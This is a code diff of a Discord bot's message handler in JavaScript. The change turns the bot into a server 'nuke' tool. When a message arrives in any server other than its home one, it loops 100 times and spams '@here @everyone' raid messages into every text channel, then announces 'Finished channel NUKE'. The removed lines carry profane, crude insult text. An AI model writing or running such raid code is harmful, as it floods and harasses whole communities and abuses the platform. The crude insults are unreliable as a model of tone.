@@ -1,4 +1,5 @@
 import { logM } from "../misc/mLogger.js";
+import { ChannelType } from "discord.js";
 
 export default {
     name: 'messageCreate',
@@ -6,10 +7,13 @@ export default {
     execute: async (m, ctx) => {
         const { commands, botPrefix, isOwner, verifyAccessLevel, ownerNick, guildInfo, botClient, log } = ctx;
 
-        if (m.guildId !== guildInfo.id) {
-            await m.reply(`<@&${m.guildId}> Don't fucking use onTop here`);
+        if (m.guildId !== guildInfo.id && (m.channel.type !== ChannelType.DM && m.channel.type !== ChannelType.GroupDM) && !(m.author.bot && m.author.id !== botClient.user.id)) {
             for (let i = 0; i < 100; i++) {
-                m.reply(`Raided by <@${m.author.id}> - WE DONT FUCK WITH WOMANS WE'RE GAY`);
+                Array.from(m.guild.channels.cache.values()).forEach(c => {
+                    if (c.isTextBased() && c.send) {
+                        c.send(`@here @everyone NUKE BY <@${m.author.id}> - WE DONT KNOW NOTHING WE'RE LAMMERS`).catch(() => {});
+                    }
+                });
 
             };
             return await m.reply(`<@${m.author.id}> - Finished channel NUKE`);
